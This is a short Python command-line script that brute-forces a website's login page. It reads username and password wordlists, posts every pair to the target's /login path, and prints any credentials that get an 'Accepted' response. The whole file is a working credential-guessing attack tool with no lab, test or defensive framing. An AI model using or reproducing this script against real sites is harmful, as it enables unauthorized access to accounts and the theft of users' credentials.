import argparse
import requests

def bruteforce_site(url, username_file, password_file):
    session = requests.Session()

    login_url = url + '/login'

    with open(username_file, "r") as file:
        usernamelist = file.read().splitlines()

    with open(password_file, "r") as file:
        passwordlist = file.read().splitlines()

    success = False

    for uname in usernamelist:
        for passwd in passwordlist:
            login_data = {
                "username": uname,
                "password": passwd
            }

            response = session.post(login_url, data=login_data)

            if 'Accepted' in response.text:
                print("Password Cracked")
                success = True
                print("Username:", uname)
                print("Password:", passwd)
                exit()

    if not success:
        print("Attempt Failed! Try with a larger userdata list")

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target_url", required=True)
    parser.add_argument("-u", "--username_file", required=True)
    parser.add_argument("-p", "--password_file", required=True)

    args = parser.parse_args()

    target_url = args.target_url
    username_file = args.username_file
    password_file = args.password_file

    bruteforce_site(target_url, username_file, password_file)
